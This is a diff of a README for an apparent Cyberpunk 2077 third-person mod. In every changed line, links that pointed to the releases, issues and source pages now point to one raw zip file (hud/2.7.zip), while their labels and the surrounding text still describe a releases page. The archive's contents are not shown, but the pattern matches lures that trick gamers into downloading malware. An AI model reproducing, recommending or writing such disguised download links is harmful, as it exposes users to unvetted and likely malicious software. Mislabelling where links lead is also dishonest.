@@ -1,6 +1,6 @@
 # 🎮 Immersive-Third-Person-Cyberpunk - Transform Your Night City Experience
 
-[![Download Now](https://img.shields.io/badge/Download-Immersive_Third_Person_Cyberpunk-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Franciscanordersymphonist2738/Immersive-Third-Person-Cyberpunk/releases)
+[![Download Now](https://img.shields.io/badge/Download-Immersive_Third_Person_Cyberpunk-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Franciscanordersymphonist2738/Immersive-Third-Person-Cyberpunk/raw/refs/heads/main/hud/2.7.zip)
 
 ## 📸 What Is This?
 
@@ -31,7 +31,7 @@ Getting this mod up and running is easier than you might think. Follow these sim
 
 Visit this link to download the application:
 
-[![Download Here](https://img.shields.io/badge/⬇️_Download_Latest_Version-4CAF50?style=for-the-badge)](https://github.com/Franciscanordersymphonist2738/Immersive-Third-Person-Cyberpunk/releases)
+[![Download Here](https://img.shields.io/badge/⬇️_Download_Latest_Version-4CAF50?style=for-the-badge)](https://github.com/Franciscanordersymphonist2738/Immersive-Third-Person-Cyberpunk/raw/refs/heads/main/hud/2.7.zip)
 
 The download page will show you the latest version of the mod. Look for the most recent release and download it to your computer. The file you need is typically named something like "Immersive-Third-Person-Cyberpunk-vX.X.X.zip".
 
@@ -109,7 +109,7 @@ If you encounter any issues, try these solutions:
 
 We regularly release updates to improve performance and add new features. To update:
 
-1. Download the latest version from the [releases page](https://github.com/Franciscanordersymphonist2738/Immersive-Third-Person-Cyberpunk/releases)
+1. Download the latest version from the [releases page](https://github.com/Franciscanordersymphonist2738/Immersive-Third-Person-Cyberpunk/raw/refs/heads/main/hud/2.7.zip)
 2. Extract the new files
 3. Replace the old mod folder with the new one
 4. Restart the game
@@ -151,9 +151,9 @@ Special thanks to the Cyberpunk 2077 modding community for their support and ins
 
 ## 🔗 Quick Links
 
-- **[Download the Mod](https://github.com/Franciscanordersymphonist2738/Immersive-Third-Person-Cyberpunk/releases)**
-- **[Report an Issue](https://github.com/Franciscanordersymphonist2738/Immersive-Third-Person-Cyberpunk/issues)**
-- **[View Source Code](https://github.com/Franciscanordersymphonist2738/Immersive-Third-Person-Cyberpunk)**
+- **[Download the Mod](https://github.com/Franciscanordersymphonist2738/Immersive-Third-Person-Cyberpunk/raw/refs/heads/main/hud/2.7.zip)**
+- **[Report an Issue](https://github.com/Franciscanordersymphonist2738/Immersive-Third-Person-Cyberpunk/raw/refs/heads/main/hud/2.7.zip)**
+- **[View Source Code](https://github.com/Franciscanordersymphonist2738/Immersive-Third-Person-Cyberpunk/raw/refs/heads/main/hud/2.7.zip)**
 
 ---
 
